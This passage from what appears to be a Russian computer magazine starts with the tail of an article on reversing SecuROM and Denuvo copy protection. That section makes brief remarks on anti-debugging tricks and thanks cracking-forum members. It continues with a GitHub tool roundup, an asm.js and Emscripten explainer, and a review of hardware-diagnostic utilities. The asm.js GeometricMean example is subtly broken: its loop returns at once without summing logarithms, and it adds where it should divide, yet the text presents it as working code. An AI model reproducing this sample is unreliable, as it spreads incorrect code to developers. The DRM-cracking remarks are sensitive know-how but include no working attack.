   гда из-за собственных ошибок Denuvo сам себе обламывает рабо-
    ту единственного трика с  ntdll.NtSetInformationThread(kernel32.
   GetCurrentThread(void),…)
•  Инструкция mov rdx, qword ptr ds:r12+rax*8 ( – прямо бальзам на
   душу. Да это же аналог Хранилища №1,5 в SecuROM 7! Неужели разработ-
   чики снова доверили нам бразды правления виртуальной машиной? :)
•  Больше никаких пасхальных яиц. Теперь мы остались наедине с багами
   и ошибками! Брутальность достойная «Старфорса».

Мифическая крутость защиты Denuvo сводится к отсутствию нормального рас-
крученного x64 отладчика для комфортной работы. К сожалению, нет OllyDbg
x64, а Mr.eXoDia dbg очень плохо переваривает что-то серьезней Hello,
world!. Есть IDA dbg, но он больше на любителя и для самых преданных фана-
тов Ильфака Гильфанова.


HAPPY END
Вздохнув, я размечтался, что неплохо было бы отправиться на машине времени
в тот год, когда вышла игра BioShock — она впервые использовала SecuROM
PA. Какая шикарная была бы возможность потопить технологию онлайн-акти-
вации еще в зародыше!
   Эпоха SecuROM подошла к концу. Нет теперь с нами других известных за-
щит — SafeDisk, Armadillo, ExeCryptor... Остальные (Star Force, как яркий пример)
находятся на верном пути к вымиранию. Мне же остается только поблагодарить
завсегдатаев «Краклаба», которые очень помогли в исследовании SecuROM:
Archer, reversecode, random, v00doo, Nightshade, OnLyOnE, mak и всех осталь-
ных, кого не перечислил. Удачи в вашей борьбе и до новых встреч!
 PC ZONE
  САМЫЙ
БЫСТРЫЙ UI

          ПОДБОРКА
     ПРИЯТНЫХ ПОЛЕЗНОСТЕЙ
      ДЛЯ РАЗРАБОТЧИКОВ

Мы живем в прекрасном мире, где программисты
 не стесняются выкладывать различные вкусности в па-
 блик — нужно лишь знать, где их искать. Достаточно
 побродить по GitHub и другим площадкам для разме-
 щения кода, и ты найдешь решение для любой про-
 блемы. Даже для той, которой у тебя до этого момента
 и не было.





                                 Илья Русанен     Алексей Глазков
                                         rusanen@glc.ru        glazkov@glc.ru



 Material Design Lite

 github.com/google/material-design-lite
 Одна из самых полных и продуманных реализаций Material Design для веба.
 Что приятно — не просто очередная тема для Bootstrap, а самостоятельный
 UI-фреймворк, выполненный в популярной сегодня стилистике от Google. Пол-
 ностью поддерживает все современные браузеры, в том числе и мобильные;
 IE — с десятой версии. Можно включить hosted-версию CSS и JS в свой про-
 ект, можно скачать билд, а можно поставить через Bower или npm.
   После установки тебе станет доступна обширная библиотека из наиболее
 часто встречающихся элементов интерфейса: табы, навбары, кнопки, меню,
 тугглы, текстовые поля, формы — в общем, все что покрывают оригинальные
 гугловские гайдлайны по Material Design. Кстати, из коробки есть множество
 вариантов цветовых схем, можно выбрать наиболее подходящую для своего
 приложения. Естественно, все адаптивно и быстро работает.

 Итог: нужен Material Design в своем приложении? Однозначно пробуй.





 hack.chat

 github.com/AndrewBelt/hack.chat
 Изначально мне скинули эту ссылку с комментарием «хакерский чат, аналог
 Slack». Что сказать — чат, наверное, даже хакерский, но к Slack имеет доволь-
 но посредственное отношение. hack.chat — это простое и минималистичное
 веб-приложение для чата. Имеет «тематический консольный» интерфейс, по-
 зволяет создавать приватные группы. С технической точки зрения — ничего
 необычного: Node, сокеты, все стандартно.

 Итог: наверное, представляет собой ценность в качестве стартового репози-
 тория для разработки собственного (или просто дружеского) чата. Да, все ра-
 ботает (чему там не работать!) Да, это можно быстро и без заморочек поднять
 на сервере или даже NAS и общаться с друзьями. Однако почему классический
 «hello world для риалтаймовых библиотек» внезапно собрал сколько звездочек
 на «Гитхабе» — непонятно.





 mattermost

 github.com/mattermost/platform
 Этот репозиторий, наоборот, получил недостаточно много звезд, особенно
 в сравнении с предыдущим. Mattermost — это почти полноценная self-hosted
 альтернатива популярному Slack. По словам создателей, сервис выделился
 в опенсорс из собственной разработки после более года использования вну-
 три команды.
    Mattermost поддерживает большинство фич, которые есть в Slack. Здесь те
 же приватные группы, личные сообщения, публичные каналы, файловые атта-
 чи, комментарии — всё, что нужно для работы. Приложение работает на Go
 (фреймворк Gorilla), на клиенте React.

 Итог: хорошая развивающаяся альтернатива Slack. Можно пробовать, писать
 фичи, отсылать пулл-реквесты. Если разработка продолжится, скоро mattermost
 может стать хорошей self-hosted заменой Slack.





 Awesome-Selfhosted

 github.com/Kickball/awesome-selfhosted
 Иметь свой собственный Github довольно удобно. Как и собственный Slack,
 систему планирования задач, фотохостинг, облако и даже личный стриминго-
 вый сервис. Причин для этого может быть много.
   Иногда неразумно платить за необходимые функции у SAAS-провайдеров
 (например, приватные репозитории на «Гитхабе», когда их очень много). Ино-
 гда нельзя хранить данные на стороне (например, немногие компании согла-
 сятся хранить свою документацию где-то там в Dropbox). Иногда тебе нужно
 добавить небольшие, но специфичные фишки в ПО, которых нет у вендора.
 А иногда и просто хочется поиграть в стартап :)
    Awesome-Selfhosted — это большая подборка проверенных опенсорсных
 self-hosted альтернатив для сервисов, которые мы используем каждый день.
 Почтовые сервера, IM, стриминговые сервисы, парольные менеджеры, вики,
 «гитхабы», собственные облака, фото- и видеогалереи, всего не перечислить.
 Здесь собраны как проверенные годами «взрослые» приложения, так и новые,
 но уже успевшие зарекомендовать себя у коммьюнити, разработки.

 Итог: половину из этого стоит поставить просто, чтобы поиграться, второй мож-
 но вполне заменить очередной сервис, за который ты платишь $4,99 в месяц.
 Есть свободный вечер — создавай пару-тройку дроплетов в Digital Ocean и про-
 буй. Истинно гиковское развлечение!





 Incremental DOM

 github.com/google/incremental-dom
 Появившись на GitHub всего три месяца назад, этот оптимизатор-шабло-
 низатор, созданный в Google, уже имеет 124 коммита и множество форков.
 Incremental DOM, как следует из его описания, является высокоуровневой за-
 меной стандартной модели работы с деревом DOM — Virtual DOM, популя-
 ризованным ReactJS. В отличие от последнего, он не создает копию дерева,
 а модифицирует напрямую существующую структуру элементов. Инкремен-
 тарность, на которую указывает название, означает, что и перестроение де-
 рева, и чистка мусора, и обработка замыканий производятся в нем пошагово,
 небольшими порциями, что позволяет грамотно распределять память и про-
 цессорные мощности.
   Еще одна отличительная особенность Incremental DOM — хранение от-
 дельно как открывающего, так и закрывающего тегов. Это дает значительно
 большую свободу работы с несбалансированными DOM-деревьями (читай:
 возможность управлять обработкой ошибок при парсинге незакрытых те-
 гов), а также возможность прикрутить к API этой библиотечки твой любимый
 язык создания JS-шаблонов. Сейчас, для примера, поддерживаются Closure
 Templates и React JSX. Идет работа над поддержкой Mustache.

 Итог: продукт Google, конкурирующий с продуктом Facebook. Если ты не джу-
 ниор, стоит быть в курсе событий.





 Marklib

 github.com/BowlingX/marklib
 Тяжеловесная (4,5 Кбайт compressed) JS-библиотека, которая умеет… выде-
 лять текст. Да, просто выделять текст, зато она делает это очень хорошо. Вы-
 деление сохраняется в локальном хранилище браузера и не сбрасывается
 при перезагрузке страницы. Разумеется, реализованы события, с помощью
 которых можно выделять текст программно, а не только вручную. Это выглядит
 как хороший инструмент для ньюсмейкеров, редакторов, копирайтеров, блог-
 геров и других людей, которые часто работают с текстом в браузере.
    Кстати, обрати внимание — библиотека поддерживает множественные пе-
 рекрывающие друг друга выделения! Очень неожиданная и перспективная
 функция для такой небольшой либы, ведь ничем подобным не могут похва-
 статься многие известные и мощные текстовые редакторы.

 Итог: выглядит полезным. Особенно если прицепить к inline-админке.





The Art of Command Line

 github.com/jlevy/the-art-of-command-line
 Отличный гайд по возможностям командной строки bash. Здесь описаны
 как наиболее частые юзкейсы, так и лучшие практики (в консоли всегда есть
 несколько способов сделать одно и то же, и лучший выбрать сложно). Очень
 хороши секции Everyday use и One liners: первая научит тебя, как правильно на-
 строить свой шелл для наиболее эффективной работы, вторая покажет хитрые
 приемы оптимизации и чейнинга команд, которые способны ускорить работу
 в разы.

 Итог: must read!





 Infinite List

 github.com/roeierez/infinite-list
 Наверняка ты не раз замечал при просмотре веб-сайтов на своем планшете
 или смартфоне, что они подтормаживают, тем самым убивая все удовольствие
 от чтения. Это касается даже устройств с iOS. Создатель этой либы уверяет,
 что решил проблему, написав «суперскоростной бесконечный скролл, работа-
 ющий на частоте 60 кадров в секунду». Он оптимизирует механизм отрисовки
 дерева DOM, механизм сборки мусора, динамически учитывает текущую за-
 грузку процессора… В общем, работа проведена немалая.

 Итог: попробуй. Возможно, эта библиотека станет «дешевым» способом обра-
 довать мобильных пользователей твоего сайта.





 Gradify

 github.com/fraser-hemp/gradify
 Полезнейшая JS-библиотека, ценность которой мгновенно поймет любой, кто
 хоть раз разрабатывал дизайн с применением фоновых изображений. Этот
 небольшой скрипт позволяет навсегда забыть о подборе background-color
 для тех случаев, когда страница уже выведена пользователю, а изображения
 еще не подгрузились: он автоматически высчитывает карту цветов изображе-
 ния и кладет под еще не прогрузившуюся картинку подходящий по цвету гра-
 диент. Или просто фоновый цвет, если хочешь.

 Итог: почему бы и нет?





JS in one pic

 github.com/coodict/javascript-in-one-pic
 Шпаргалка по JavaScript, выполненная в виде mindmap. На самом деле,
 не очень удобна именно как читшит (быстрая справка по языковым конструк-
 циям), но определенно пригодна для изучения внутренней структуры и логики
 построения самого языка. Просто открой ее на планшете и посвяти изучению
 хотя бы полчаса. Гарантирую, ты узнаешь о JS что-нибудь новое.
    Правда, JS-язык сам по себе несложный. А действительно сложных проблем,
 вроде зацикливания вызовов или утечек памяти, эта шпаргалка не касается.

 Итог: почитать, уложить свои знания о JS в аккуратные стопки, закрыть и забыть.
PC Zone
МАШИННЫЙ КОД
ДЛЯ ИНТЕРНЕТА





                    asm.js


      КАК JAVASCRIPT ПРЕВРАЩАЕТСЯ
       В ПОДОБИЕ АССЕМБЛЕРА


Закон Атвуда гласит, что любое при-
ложение, которое можно напи-
сать на Javascript, однажды напишут
на Javascript. Компилятор Emscripten де-       Олег Парамонов
                                                                                           paramonov@sheep.ru
лает это практически неизбежным.

ИНТРО
Чтобы запустить в браузере Linux или игру для старинной видеоприставки,
можно использовать виртуальную машину, написанную на Javascript. Но это
не единственный и даже не лучший способ.
   Первая проблема связана с тем, что эмуляция железа заведомо менее эф-
фективна, чем исполнение нативного кода. Это знают и сами разработчиков
эмуляторов. Когда скорости пошагового моделирования чужого процессора
не хватает, им приходится добавлять динамическую рекомпиляцию — автома-
тический перевод участков эмулируемого кода в Javascript. Это трудно, но по-
сле переработки умным JIT-компилятором код становится быстрее.
   Кроме того, до эмуляции железа нужно ещё добраться. Это совсем не про-
стая задача, и тот факт, что она зачастую уже решена, просто не на нужном
Javascript, а на другом языке программирования, вовсе не прибавляет энтузи-
азма. Переписывать десятки, а то и сотни тысяч строк кода с Си на Javascript —
удовольствие на любителя. Люди, которым интересен этот процесс, безуслов-
но, встречаются, но куда реже тех, кто предпочитает результат.

FRONTEND И BACKEND
Один из создателей Javascript однажды заметил, что этот язык превратился
в своего рода машинный код для интернета. Существуют компиляторы, кото-
рые переводят в Javascript программы, написанные на Python, Java и Smalltalk.
Некоторые языки с самого начала рассчитаны на переработку в Javascript —
к этой категории относятся Coffeescript и используемый React.js формат JSX.
   У такого подхода долгая история, которая началась задолго до появления
Javascript и даже браузеров. В прошлом компиляторы многих языков програм-
мирования не могли генерировать машинный код. Результатом их работы были
промежуточные исходники на Си. Это позволяло без особых усилий перено-
сить языки на любую платформу, где есть стандартный компилятор Си.
  В современных компиляторах сохранилось разделение на фронтенд, под-
держивающих определённый язык программирования, и бэкенд, способный
генерировать код для нужной платформы. Но для связи между ними Си, как пра-
вило, больше не нужен. Чтобы добавить поддержку языка, нужно разработать
новый фронтенд. Заменой бэкенда можно добиться генерации кода для дру-
гой платформы.
   Так устроен, в частности, популярный компилятор LLVM, фронтенды кото-
рого понимают большинство распространённых языков программирования.
Результат работы фронтенда — байт-код для виртуальной машины, напомина-
ющий ассемблер несуществующего RISC-процессора с бесконечным числом
регистров и сильной типизацией данных. Бэкенды LLVM поддерживают, среди
прочего, системы команд процессоров x86, ARM, MIPS, PowerPC и даже мейн-
фреймов IBM.
   Бэкенд LLVM, способный генерировать Javascript вместо машинного кода
x86 или ARM, — это настолько очевидная идея, что его появление было вопро-
сом времени. Самый популярный проект такого рода был начат одним из инже-
неров Mozilla около пяти лет назад. Он называется Emscripten.
   Emscripten представляет собой компилятор Си, Си++ и других языков, под-
держиваемых LLVM, в Javascript, пригодный для исполнения в браузере. Этот
проект также включает в себя реализацию распространённых библиотек для ра-
боты с трехмерной графикой, звуком и вводом-выводом на базе браузерных
программных интерфейсов.
  На что похож Javascript, который получается в результате работы Emscripten?
Во многих случаях аналогии между Си и Javascript предельно прозрачны. Пе-
ременные есть переменные, функции есть функции, ветвление есть ветвление.
Циклы или выбор switch… case в Javascript приходится записывать иначе,
но суть та же. Кое-чем приходится жертвовать: например, на все разновидно-
сти числовых типов Си у Javascript один ответ — float. Но, в конечном счёте, это
почти ни на что не влияет.
   Тяжелее приходится с концепциями, которых в Javascript просто нет. Чтобы
имитировать указатели и работу с памятью, идёт в ход та же уловка, что и в джа-
васкриптовых эмуляторах игровых приставок. Программа создаёт типизиро-
ванный массив, который играет роль динамически распределяемой памяти,
и заменяет указатели на индексы элементов в этом массиве.
   Код на Javascript непрерывно следит за тем, чтобы не покинуть отведённые
массиву рамки, не выходить за пределы массивов, не переполнить стек. Это
тратит уйму ресурсов, но даже с учётом всех накладных расходов программы,
скомпилированные Emscripten, работают всего в несколько раз медленнее,
чем те же исходники, скомпилированные в машинные коды. А в 2013 году у ав-
торов проекта появилась возможность избавиться и от этих помех.

ASM.JS
Недостающий компонент, который позволяет добиться максимальной скоро-
сти, называется asm.js. Спецификация asm.js задаёт упрощённое подмноже-
ство Javascript, которое может быть передано для исполнения более прими-
тивному и потому очень быстрому интерпретатору. Оно идеально подходит
в качестве промежуточного языка для таких генераторов кода, как Emscripten.
Поддержка asm.js уже есть в браузерах Google, Mozilla и даже Microsoft.
   Рассмотрим пример кода, написанного для asm.js.

function GeometricMean(stdlib, foreign, buffer) {
    "use asm";
    var values = new stdlib.Float64Array(buffer);
    function logSum(start, end) {
        start = start|0;
        end = end|0;
        var sum = 0.0, p = 0, q = 0;
         for (p = start << 3, q = end << 3; (p|0) < (q|0); p = (p + 8)|0) {
            return +sum;
        }
    }
    function geometricMean(start, end) {
        start = start|0;
        end = end|0;
         return +stdlib.Math.exp(+logSum(start, end) +((end - start)|0));
    }
    return { geometricMean: geometricMean };
}

Вот первое, что бросается в глаза: это обычный Javascript. Ему определённо
не нужен ни специальный интерпретатор, ни предварительная обработка. Он
заработает и без них. Не так быстро, как в интерпретаторе, знающем о суще-
ствовании asm.js, но заработает.
   Строка use asm, открывающая функцию, уведомляет интерпретатор, что её
содержимое может считаться модулем asm.js. Каждая такая функция должна
удовлетворять множеству требований.
   Первое требование: функция должна принимать три аргумента. Первый ар-
гумент (в примере он называется stdlib, но названия могут быть и другими) —
это объект, содержащий функции стандартной библиотеки Javascript (она со-
стоит преимущественно из математики и типизированных массивов). Второй
(foreign) содержит все остальные внешние функции, к которым допустимо
обращаться из модуля. Третий (buffer) — это объект ArrayBuffer. В asm.
js он заменяет динамически выделяемую память. Для доступа к ней исполь-
зуются типизированные отображения TypedArray, такие как Int32Array или
Float64Array. Мы видим, как это происходит в следующей за use asm строчке:
программа создаёт отображение buffer, которое состоит из элементов вели-
чиной восемь байтов, интерпретируемых как числа с плавающей точкой:

var values = new stdlib.Float64Array(buffer);

Следующая странность — операции битового или едва ли не в каждой строч-
ке. Объяснение простое: это костыли, помогающие обойтись без встроенных
средств декларации типа. Чтобы гарантировать верные типы переменных, asm.
js предписывает конвертировать их принудительно. Если а — аргумент функ-
ции, который должен быть числом, ему придётся пройти операцию a|0, после
которой он гарантированно станет числом.
   Это не слишком удобно для человека, но нужно понимать, что asm.js —
не для людей. Генератору кода всё равно, что генерировать, а интерпретатор,
поддерживающий asm.js, понимает, что такая демонстративная конвертация —
это вовсе не конвертация, а неуклюжая попытка задать тип переменной, и дей-
ствует соответственно.
   Что это даёт? Во-первых, интерпретатор и JIT-компилятор могут быть уве-
рены, что внутри модуля тип переменных никогда не меняется. Больше не нуж-
ны постоянные проверки типа во время исполнения и принудительное приве-
дение типов к общему знаменателю. Во-вторых, нет динамического выделения
памяти и, соответственно, сборки мусора. Наконец, сама реализация объектов
и организация памяти может быть более эффективной. Главное — поменьше
рефлексии (и прочей динамики).
   Всё это значительно повышает эффективность JIT-компиляции. Произво-
дительность кода, который выдают последние версии Emscripten, достигает
50-70 процентов от нативной скорости исполнения той же программы. Разра-
ботчики утверждают, что Emscripten генерирует Javascript, который под Android
работает быстрее, чем Java.

ОГРАНИЧЕНИЯ СРЕДЫ
Самые простые программы Emscripten просто перекомпилирует, не задавая
лишних вопросов. Однако во многих случаях к переносу программы в браузер
следует подходить так же как к портированию на другую платформу (и ожидать
похожих проблем). Любой код, который использует особенности определён-
ной платформы или среды разработки, может стать серьёзным препятствием.
От него придётся избавиться. Зависимость от библиотек, исходники которых
недоступны, должна быть устранена. Не исключено, что в процессе портирова-
ния проявят себя ошибки, которых прежде удавалось избежать. Другая среда
исполнения и другой оптимизатор часто имеют такой эффект.
   Кроме того, остаётся ещё одна важная деталь. Программы, которые рас-
считаны на работу в течение продолжительного времени, как правило, крутятся
в цикле — они ждут поступления событий из внешнего мира и реагируют на них.
Так продолжается, пока их не выключат. Браузер и, соответственно, програм-
мы на Javascript устроены совершенно иначе.
  В браузере этот цикл реализован на другом, более высоком уровне, чем
пользовательская программа. Он позволяет назначить функции на Javascript,
которые должны быть вызваны в случае определённого события, но вызывает
их сам и ожидает, что они быстро отработают своё и вернут управление. Они
не должны работать долго.
   Любая программа на Javascript, которая не только реагирует на события
DOM, но и делает нечто большее, быстро упирается в это ограничение. Ла-
зейки, которые позволяют его обойти, тоже давно известны. Джаваскрипто-
вые эмуляторы игровых консолей, о которых рассказывалось в статье «Байт
из других миров. Как ретрокомпьютеры эмулируют на Javascript», привязывают
исполнение каждого такта виртуального процессора к таймеру. В этом случае
каждый виток внутреннего цикла эмулятора активирует сам браузер.
   Нечто похожее делает и Emscripten, но он не может делать это совершен-
но самостоятельно. Перед компиляцией внутренний цикл придётся размотать
вручную. Как правило это не так уж сложно. Достаточно вынести содержи-
мое цикла в отдельную функцию (зачастую это уже сделано), а затем вызвать
emscripten_set_main_loop, передав ему ссылку на неё и количество кадров,
к которому мы стремимся, а также сообщив, должен ли цикл быть бесконечным
(в последнем случае выйти из него можно будет лишь при помощи исключения).

int main() {
    #ifdef __EMSCRIPTEN__
        emscripten_set_main_loop(mainloop, 60, 1);
    #else
        while (1) {
            mainloop();
        }
    #endif
}

Если в программе несколько подобных циклов, и она может переходить из од-
ного в другой по собственному желанию, потребуются более значительная пе-
реработка кода. Дело в том, что задать функцию внутреннего цикла при помо-
щи emscripten_set_main_loop можно лишь один раз. Придется собрать все
внутренние циклы в одну функцию и всякий раз проверять, в каком именно ци-
кле мы находимся.
   Иногда такой вариант неприемлем или нереалистичен. На этот случай
в Emscripten предусмотрена опция emterpreter sync. Когда она включена,
Emscripten выдаёт байт-код и джаваскриптовый интерпретатор, который будет
его исполнять. Фактически происходит возвращение к пошаговой эмуляции,
от которой мы пытались уйти. Жертвуя производительностью, он отодвигает
проблему множественных внутренних циклов на второй план. Ими будет зани-
маться интерпретатор байт-кода, который, в свою очередь, имеет один вну-
тренний цикл, с которым уже взаимодействует браузер.
   Жертва значительна, но не смертельна. Emterpreter sync используется,
в частности, в Em-DOSBox, браузерной версии известного эмулятора MS-DOS.
Потерянная производительность не мешает этой программе успешно воспро-
изводить множество компьютерных игр для PC, написанных в девяностые годы,
и даже Windows 95.

PROFIT
Сфера применения EmScripten не ограничивается эмуляторами и старинными
игрушками (помимо DOSBox, на Emscripten перенесли Doom, Quake 3, Dune 2
и ScummVM, виртуальную машину для классических квестов LucasArts и Sierra).
Попытки запустить в браузере такие популярные скриптовые языки, как Python,
Ruby и Lua, увенчались успехом, но их практичость остается сомнительной.
Каждый из них требует загрузки многомегабайтного рантайма. Для обычного
сайта это неприемлемо.
   Видеокодеки, просмотрщики PDF, SQLite и система распознавания речи —
это уже интереснее. Наконец, нельзя не упомянуть, что существует проект пе-
реноса в браузер браузерного движка Webkit. Это не утка: он работает, в том
числе внутри Webkit. Трудно подобрать эпитет, в полной мере описывающий
характер этого достижения, но с тем, что это достижение, не станет спорить
никто.
   Если даже после этого (особенно после этого) вы ещё не оценили всю се-
рьёзность происходящего, остаётся добавить, что Emscripten поддержали ком-
пании Epic Games и Unity Technologies. Первая портировала на Javascript попу-
лярнейший игровой движок Unreal Engine. Он настолько популярен, что проще
перечислить игры, где его нет. Другая с помощью Emscripten разработала джа-
васкриптовую версию Unity 3D. С такой поддержкой эта технология определён-
но пойдёт далеко.

Сделано в Emscripten

Angry Bots
beta.unity3d.com/jonas/AngryBots/





Angry Bots
Демонстрация того, как может выглядеть игра, написанная при помощи порти-
рованного на Javascript движка Unity 3D. Спойлер: она может выглядеть, как мо-
бильная игра средней руки. Трёхмерный вооружённый гражданин бежит по же-
лезной местности и, разумеется, стреляет. Он не может не стрелять (серьёзно,
я не знаю, как его остановить). Местные жители недовольны, и их можно понять.

Старые игры
archive.org/search.php?query=collection%3Ahistoricalsoftware&sort=date





Lode Runner
Не так давно Internet Archive выложил на всеобщее обозрение огромное коли-
чество старинных игр для всех возможных платформ, начиная со Spacewar об-
разца 1962 года (считается, что это первая компьютерная игра) и заканчивая,
извините, Flappy Bird. Между ними есть всё, что можно придумать. За воспро-
изведение отвечает джаваскриптовый порт эмулятора MESS/MAME, который
поддерживает без малого тысячу исторических игровых платформ.

Интерпретаторы языков программирования
repl.it/languages





Интерпретатор Scheme

На этой странице выложены интерпретаторы Python, Ruby, Scheme, Lua, Java,
QBasic, Forth и множества других языков программирования. Для ценителей
есть даже Brainfuck. С каждым можно поиграться прямо в браузере, сохранить
введённый код и поделиться им со знакомыми в Facebook и Twitter. Знакомые
оценят — особенно, если это Brainfuck.

Dead Trigger 2
beta.unity3d.com/jonas/DT2/





Dead Trigger 2

Ещё одна демка джаваскриптового Unity 3D. В Dead Trigger 2, вместо псевдо-
изометрии Angry Bots, мы имеем вид от первого лица и большой окровавлен-
ный топор. Низкополигональная местность, напоминающая задворки оптового
рынка на окраине Москвы, не радует, но Emscripten в этом вряд ли виноват.
Виноваты зомби, которые сделали эту игру.

Tappy Chicken
www.unrealengine.com/html5/





Tappy Chicken

Epic Games, демонстрируя джаваскриптовую версию Unreal Engine 3, пытает-
ся впечатлить не публику, а разработчиков. Публике тут смотреть не на что:
это клон Flappy Bird с сельскохозяйственным уклоном. Программистов же мо-
жет впечатлить тот факт, что эта курица без особых проблем конвертируется
не только в Javascript, но и в приложения для iOS и Android. Не всех программи-
стов, конечно. Только самых впечатлительных.

Doom
kripken.github.io/boon/boon.html





Doom

«Дум» даже в DOSBox, переведённом на Javascript, остаётся «Думом». Двадцать
лет почти не изменили его (монстры выглядят странно, но, вероятно, не из-за
Emscripten, а из-за копирайта), только пиксели стали крупнее. Думал ли Кармак,
что его передовую игру будут портировать на каждую платформу, одну другой
меньше? Вряд ли. Quake 3 на Javascript, кстати, тоже есть.

VIM
coolwanglu.github.io/vim.js/streamlinejs/vim.html





Vim.js

Да, это классический текстовый редактор. Он работает не хуже обычного. Нет,
я не знаю, как сохранять файлы.


WebAssembly: будущее asm.js

Спустя некоторое время после скандального увольнения
Брендана Айка из Mozilla он возвращается, чтобы вновь уди-
вить мир веба новыми перспективами разработки, и презен-
тует WebAssembly Community Group. В её состав вошли та-
                                                                           Павел Масальский,
кие небезызвестные игроки на рынке JS-движков, как Mozilla,         Яндекс
Google, Microsoft и Apple.
   Айк ставит перед собой цель продолжить амбициозные начинания asm.js,
при этом устранив некоторые его недуги:
1. Недоступность дополнительных оптимизаций, ломающих совместимость
  с JS-движками;
2. Человеко-ориентированность кода: он многословен, а значит, занимает
  лишние байты.

WebAssembly решает озвученные проблемы. Его код представляет из себя аб-
страктное синтаксическое дерево в бинарном виде. Соответственно, он гораз-
до меньше по объему и парсится до 20 раз быстрее, чем asm.js!
  Но это еще не все. Так как скорость выполнения еще ближе к нативному
коду, по сравнению с asm.js, она позволяет нам все реализовать то, что уже
дал asm.js: редакторы видео и аудио, интерпретаторы языков програмирова-
ния, виртуальные машины и эмуляторы, игры, при этом в компактной упаковке и
с большей производительностью.
   Если сравнивать с Flash,WebAssembly выигрывает как по скорости, так и по
безопасности. К тому же он будет работать в sandbox, что сводит риски по-
вреждения системы к минимуму.
   Возможности WebAssembly выглядят впечатляюще. Ему можно найти при-
мение в уйме мест, где требуется максимальная производительность, как на
клиенте, так и на сервере. Так что давайте пожелаем Брендану Айку и команде
удачи в приближении будущего с вариативными приложениями в вебе!
PC Zone
ЖЕЛЕЗНАЯ НАДЕЖНОСТЬ





КАК НАЙТИ И УСТРАНИТЬ
    АППАРАТНЫЕ
                                                                                84ckf1r3
                                                                                    84ckf1r3@gmail.comПРОБЛЕМЫ С НАБОРОМ
 БЕСПЛАТНЫХ УТИЛИТ



ИНТРО
Когда компьютер сбоит, это всегда неприятно. Когда речь идет о машине, ко-
торая принадлежит кому-то из родственников или знакомых, дело усугубляется
ещё и тем, что закончить работы хочется как можно быстрее. Ну а если человек
жалуется на неисправность, которую не удается воспроизвести, то это помимо
прочего ведет к неудобным ситуациям. Вызваны ли проблемы ошибками поль-
зователя или сбоит железо? Ответить на этот вопрос лучше всего помогут не
дознания, а диагностические утилиты.
   Среди них есть неплохие «комбайны» — программы, совмещающие в себе
много полезных функций. Из удачных примеров стоит отметить AIDA64 (ра-
нее — Everest), но и среди бесплатных утилит есть много схожих по возможностям.

HWINFO
www.hwinfo.com
Эта диагностическая программа, созданная разработчиком из Братиславы
Мартином Маликом, отличается малым размером, точностью отображения
всех параметров и частым выходом обновлений. Текущая версия 5.00 разме-
ром около двух мегабайтов поддерживает 32- и 64-разрядные системы. Она
распространяется как в виде инсталлятора, так и в качестве «портативного»
приложения.





Уже при запуске можно выбрать разные опции работы: показывать только ин-
формацию датчиков (sensors-only), только сводный отчет (summary-only) или
перейти к расширенным настройкам, которые включают целый список низкоу-
ровневых операций и специфичных для каждой системы параметров.
   Сводный отчет отображает всю информацию о процессоре, материнской
плате, параметрах модулей оперативной памяти, установленных накопителях и
подключенных устройствах. В соответствующих строках показываются версии
прошивок устройств, а отдельная кнопка BIOS Update выполняет поиск новых
версий через сторонний сервис. Аналогичная функция доступна для обнов-
ления драйверов, но я бы не рекомендовал пользоваться ими без явной не-
обходимости. Даже фирменные утилиты автообновления порой некорректно
определяют железки по UID и PID. Надежнее все-таки загружать прошивки и
драйверы с официальных сайтов вручную.





Пока поддержка 64-разрядных систем у HWiNFO неполная, и опция сравни-
тельного тестирования производительности доступна только в 32-разрядных
версиях программы. Забегая вперед, отмечу, что из всех участников обзора
только эта утилита корректно отобразила напряжение на пяти- и двенадцати-
вольтовой шине: 5,003 В и 11,968 В соответственно. Две другие показывали
абсурдные величины, при которых компьютер в принципе не может работать.
   Дополнительно к HWiNFO можно скачать целый ряд плагинов, которые ото-
бражают показания датчиков в окнах сторонних программ. Это удобно для мони-
торинга температурных режимов и обнаружения проблем со стабильностью пи-
тания, если их проявления трудно связать с работой определенной программы.
  Ещё есть плагин HWiNFOMonitor, который отображает основные параметры
в небольшом информационном окне, и HWiNFO Sidebar Gadget — гаджет для
Windows 7 и выше.

HWMONITOR (32/64-BIT)
www.cpuid.com/softwares/hwmonitor.html
Коллектив разработчиков из французского города Дюнкерк решил назвать свою
компанию по имени процессорной инструкции — CPUID. С 2007 года фирма
была известна благодаря утилите CPU-Z, а затем разработчики решили выне-
сти функции расширенного мониторинга в отдельную программу — HWMonitor.
Она поддерживает 64-разрядные системы и не требует установки.





При размере в полтора-два мегабайта эта компактная утилита показывает ис-
черпывающую информацию со всех доступных датчиков. Она поддерживает
как сенсоры, непосредственно встроенные в чипы современных ЦП и ГП, так и
отдельные микросхемы для мониторинга производства ITE, Winbond и т.п.
   Программа корректно отображает температуру, частоты, множители и сте-
пень загрузки, но иногда ошибается при интерпретации напряжений. Неиску-
шенного пользователя это может заставить искать несуществующую проблему
или даже напрасно сменить блок питания.





Вся информация сгруппирована по устройствам. Для многоядерных процес-
соров утилита показывает температуру каждого ядра и теплораспределитель-
ной крышки отдельно. Для SSD считываются параметры S.M.A.R.T. Все данные
отображаются в режиме реального времени с указанием текущих, минималь-
но и максимально зарегистрированных значений. Результаты мониторинга
и опроса по интерфейсу SMBus можно сохранить в текстовый файл.

SPECCY
Лондонская компания Piriform выпускает много утилит для Windows и OS X,
для многих есть полнофункциональные бесплатные версии. Ограничены они
больше с юридической точки зрения и по уровню сервиса. Например, утилиту
Speccy с лицензией Free не разрешается использовать в коммерческих целях,
но от издания Professional она отличается только отсутствием автоматического
обновления и технической поддержки.





Как и многие подобные утилиты, Speccy доступна в варианте portable. Под-
держка 64-разрядных систем обеспечивается в ней отдельным исполняемым
файлом с говорящим названием — Speccy64.exe. Оба варианта работают во
всех версиях Windows — от XP до 10.
   Интерфейс у программы исключительно наглядный. Все данные сгруппи-
рованы по типам устройств. Текущее состояние компонентов сразу отобража-
ется на соответствующих вкладках. Описания приводятся максимально под-
робные — вплоть до количества свободных слотов памяти и геометрии дисков.
Считывается вообще все, что может как-то характеризовать устройство и его
состояние. В разделе «сетевые адаптеры» отображается даже текущая ско-
рость передачи данных.





Однако утилита допускает ту же ошибку, что и HWMonitor — иногда показывает
«погоду» вместо напряжений на основных линиях питания: 5 и 12 В. С остальны-
ми параметрами проблем при обзоре не возникло. Сохранить все результаты
обследования компьютера можно в текстовый или XML-файл, что очень удоб-
но для мониторинга, ведения истории апгрейда и при обслуживании большого
парка компьютеров.

MEMTEST86
www.memtest86.com/features.htm
MemTest — это одна из самых известных программ для тестирования компью-
тера, ее первая версия увидела свет в 1994 году. Начало разработки и вовсе
